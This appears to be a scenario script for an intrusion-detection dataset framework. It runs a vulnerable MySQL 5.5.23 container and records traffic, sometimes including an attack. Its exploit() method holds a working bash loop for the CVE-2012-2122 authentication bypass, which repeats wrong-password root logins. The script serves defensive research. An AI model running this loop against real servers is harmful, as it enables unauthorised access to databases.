import sys
import random
import subprocess

import pymysql

from lid_ds.core import Scenario
from lid_ds.core.collector.json_file_store import JSONFileStorage

warmup_time = int(sys.argv[1])
recording_time = int(sys.argv[2])
is_exploit = int(sys.argv[3])
do_exploit = True
if is_exploit < 1:
    do_exploit = False

total_duration = warmup_time + recording_time
exploit_time = random.randint(int(recording_time * .3), int(recording_time * .8))

min_user_count = 10
max_user_count = 25
user_count = random.randint(min_user_count, max_user_count)


class CVE_2012_2122(Scenario):
    def exploit(self, container):
        subprocess.Popen(r'''#!/bin/bash
                for i in `seq 1 1000`;
                do
                    mysql -uroot -pwrong -h 127.0.0.1 -P3306 2>/dev/null;
                done''', shell=True, executable='/bin/bash')

    def init_victim(self):
        try:
            db = pymysql.connect("localhost", "root", "123456")
            try:
                db.cursor().execute('create database ' + "textDB")
            except:
                pass

            self.db = pymysql.connect("localhost", "root", "123456", "textDB")
            sql = """CREATE TABLE `texts` (
                         `id` int(11) NOT NULL AUTO_INCREMENT, 
                         `text` varchar(255) COLLATE utf8_bin NOT NULL, 
                         PRIMARY KEY (`id`)
                     ) 
                     ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin 
                     AUTO_INCREMENT=1 ;"""
            self.db.cursor().execute(sql)
        except Exception as e:
            pass

    def wait_for_availability(self, container):
        try:
            db = pymysql.connect("localhost", "root", "123456")
        except Exception:
            return False
        return True


storage_services = [JSONFileStorage()]


if do_exploit:
    scenario_normal = CVE_2012_2122(
        image_name='vulhub/mysql:5.5.23',
        exploit_image_name="python:alpine",
        normal_image_name="normal_mysql",
        port_mapping={
            '3306/tcp': 3306
        },
        user_count=1,
        warmup_time=warmup_time,
        recording_time=recording_time,
        storage_services=storage_services,
        exploit_start_time=exploit_time,
    )
else:
    scenario_normal = CVE_2012_2122(
        image_name='vulhub/mysql:5.5.23',
        exploit_image_name="python:alpine",
        normal_image_name="normal_mysql",
        port_mapping={
            '3306/tcp': 3306
        },
        user_count=2,
        warmup_time=warmup_time,
        recording_time=recording_time,
        storage_services=storage_services,
    )

scenario_normal()
